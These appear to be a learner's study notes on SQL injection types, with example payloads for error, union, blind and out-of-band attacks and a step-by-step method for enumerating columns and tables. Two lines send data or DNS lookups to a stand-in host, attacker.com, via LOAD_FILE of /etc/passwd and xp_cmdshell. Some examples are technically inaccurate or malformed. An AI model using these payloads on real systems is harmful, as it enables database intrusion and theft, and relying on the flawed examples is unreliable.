#  SQL Injection Types and Explanation

SQL Injection (SQLi) is a vulnerability that allows attackers to manipulate a web application's query to the database. It occurs when user input is improperly sanitized, allowing the attacker to inject malicious SQL code. There are several types of SQL injection techniques:

## Types of SQL Injection:

### 1. In-band SQL Injection:

- **Definition:** In-band SQL injection is the most common type of SQLi where the attacker uses the same communication channel to inject and retrieve data from the database.

- **Techniques:**

  - **Error-based SQLi:** The attacker injects malicious SQL code and relies on database error messages to reveal information about the structure of the database. These errors can leak valuable data.

    - **Example:**

      ` ' OR 1=1; -- `

      Injecting this into a vulnerable query like:

        SELECT * FROM users WHERE username = '' OR 1=1 -- ' AND password = '';

      This will return all records in the `users` table.

  - **Union-based SQLi:** The attacker uses the `UNION` operator to combine the results of the original query with the results of an injected query, allowing them to retrieve additional data.

    - **Example:**

      ` ' UNION SELECT username, password FROM users; -- `

      If injected into a vulnerable query like:

        SELECT id, name FROM products WHERE id = [input];

      The attacker can retrieve data from the `users` table instead of the `products` table.

  

### 2. Blind SQL Injection:

- **Definition:** In blind SQL injection, the attacker cannot directly see the result of the query but can infer it based on the application's behavior (e.g., if the page loads or an error occurs).

- **Techniques:**

  - **Boolean-based blind SQLi:** The attacker injects SQL statements that evaluate to true or false and observes how the website responds. Based on the response, the attacker can deduce information.

    - **Example:**

      ` ' AND 1=1; -- (True condition)`  

      ` ' AND 1=2; -- (False condition)`  

      By observing if the query returns data (or the page behaves differently), the attacker can infer whether the condition is true or false.

  - **Time-based blind SQLi:** The attacker uses SQL functions like `SLEEP()` or `BENCHMARK()` to delay the response from the database. If a delay occurs, the attacker knows the query executed successfully.

    - **Example:**

      ` ' OR IF(1=1, SLEEP(5), 0); -- `

      If the page takes longer to load, the attacker can confirm that the condition is true.

  

### 3. Out-of-Band SQL Injection:

- **Definition:** Out-of-band SQL injection occurs when the attacker cannot use the same communication channel to inject and retrieve data. Instead, they use a separate channel (like HTTP requests or DNS queries) to receive the results of the query.

- **Example:**

  - Using SQL functions like `LOAD_FILE()` or `xp_dirtree` to send data to a remote server controlled by the attacker.

  - **Example:**

    ` ' UNION SELECT LOAD_FILE('/etc/passwd') INTO OUTFILE 'http://attacker.com/log.txt'; -- `

    In this case, the result of the query is sent to an external server, providing the attacker with sensitive information without directly showing it on the vulnerable website.

  

## In-Band SQL Injection vs. Out-of-Band SQL Injection:

  

- **In-band SQL Injection:**

  - **Same channel for attack and data retrieval.**

  - Easier to execute since the attacker directly sees the results (error messages, database response).

  - Examples include **Error-based** and **Union-based** SQLi.

  

- **Out-of-band SQL Injection:**

  - **Different channel for attack and data retrieval.**

  - Often used when the application does not return results or give direct feedback.

  - Relies on methods like sending results to external servers using DNS queries, HTTP requests, etc.

  

### In-Band Example:

  

    SELECT * FROM users WHERE username = 'admin' AND password = 'admin' OR '1'='1';

The query becomes:

    SELECT * FROM users WHERE username = 'admin' AND password = 'admin' OR '1'='1';

The injected part `'1'='1'` always evaluates to `TRUE`, which returns all rows in the table.

  

### Out-of-Band Example:

  

    '; EXEC xp_cmdshell('nslookup attacker.com'); --

Here, the attacker is using SQL Server’s `xp_cmdshell` to execute a system command (like `nslookup`) that sends a DNS query to an external server (`attacker.com`). This allows the attacker to confirm the vulnerability without getting direct feedback from the web application.














## SQL syntax 
-` select * where  from table where user ='joe' limit 0,1  ;   --` limit is here to limit the numbers of the output

## classification
- **First-Order SQL Injection:**
    
    - **Definition:** In a first-order SQL injection attack, the malicious payload is directly inserted into the application's database query.
    - **Execution:** The attacker typically injects SQL code through user inputs, such as form fields or URL parameters. When the application processes these inputs without proper validation or sanitization, the injected SQL code gets executed by the database.
    - **Example:** If a web form accepts user input for a username and constructs a SQL query like `SELECT * FROM users WHERE username = '<user_input>';`, an attacker could input `' OR 1=1 --` to manipulate the query to return all records from the `users` table.
- **Second-Order SQL Injection:**
    
    - **Definition:** Second-order SQL injection involves injecting malicious payloads that are stored within the application's database, rather than being directly inserted into a query.
    - **Execution:** The injected data is stored in the database first and then later retrieved and used in a query. When the application retrieves and uses this data in a query without proper validation or sanitization, it inadvertently executes the injected SQL code.
    - **Example:** An attacker might submit malicious input that gets stored in the database (e.g., during registration or profile updates). Later, when another user or administrator views that data, the application constructs a query using the stored, but now malicious, input.
## injection 
- union cannot work if  the query calls  different numbers of columns 
- so we check for the number of columns in the query by `order by ***`
- if the number you gave  is work increase until it didn't work so the last number worked is the correct number  
- and then u need to know what number is interpreted in the page 
- by using `jeremy 'union select 1,2,3 #`
- after checking for numbers of calls  then you should use this 
- ` jeremy 'union select 1,2,table_name from information_schema.tables where table_schema =database() ; #`
- you use a valid syntax and then u inject the payload
